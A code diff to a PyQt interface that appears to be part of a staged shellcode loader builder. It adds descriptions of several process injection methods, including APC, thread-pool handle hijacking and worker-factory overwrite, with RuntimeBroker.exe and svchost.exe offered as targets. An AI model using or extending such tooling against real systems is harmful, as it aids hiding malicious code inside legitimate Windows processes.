@@ -177,6 +177,7 @@ class StagedTab(QWidget):
             parent=self)
         self._payload_edit.path_changed.connect(
             lambda: self._clear_validation(self._payload_edit))
+        self._payload_edit.path_changed.connect(self._autofill_output)
         layout.addWidget(self._payload_edit)
         layout.addStretch()
         return page
@@ -205,7 +206,12 @@ class StagedTab(QWidget):
         self._inject_combo.setMinimumWidth(140)
         form.addRow("Injection:", self._inject_combo)
 
-        self._target_label = QLabel("Target process:")
+        self._inject_desc = QLabel()
+        self._inject_desc.setWordWrap(True)
+        self._inject_desc.setStyleSheet("color: #888888; font-size: 11px; padding: 2px 0 4px 0;")
+        form.addRow("", self._inject_desc)
+
+        self._target_label = QLabel("Target process (remote):")
         self._target_combo = QComboBox()
         self._target_combo.addItems(["RuntimeBroker.exe", "svchost.exe"])
         self._target_combo.setMinimumWidth(140)
@@ -442,9 +448,27 @@ class StagedTab(QWidget):
         self._on_format_changed(self._format_combo.currentText())
 
     def _on_inject_changed(self, method: str):
+        _DESCS = {
+            "apc":          "Remote — spawns a new suspended process and queues APC to main thread",
+            "copyfile2":    "Self-injection — executes via CopyFile2 progress callback in current process",
+            "tp_direct":    "Remote — hijacks IoCompletion handle, queues shellcode via ZwSetIoCompletion",
+            "wf_overwrite": "Remote — hijacks TpWorkerFactory handle, overwrites StartRoutine in target",
+            "timerqueue":   "Self-injection — registers shellcode as a one-shot CreateTimerQueueTimer callback",
+        }
+        self._inject_desc.setText(_DESCS.get(method, ""))
         is_apc = method == "apc"
-        self._target_label.setVisible(is_apc)
-        self._target_combo.setVisible(is_apc)
+        is_remote = method in ("apc", "tp_direct", "wf_overwrite")
+        self._target_label.setVisible(is_remote)
+        self._target_combo.setVisible(is_remote)
+
+    def _autofill_output(self):
+        """Auto-fill output field from payload filename if output is still blank."""
+        if self._output_edit.text().strip():
+            return
+        path = self._payload_edit.text().strip()
+        if path:
+            from pathlib import Path
+            self._output_edit.setText(Path(path).stem)
 
     def _on_format_changed(self, fmt: str):
         is_exe = fmt == "EXE"
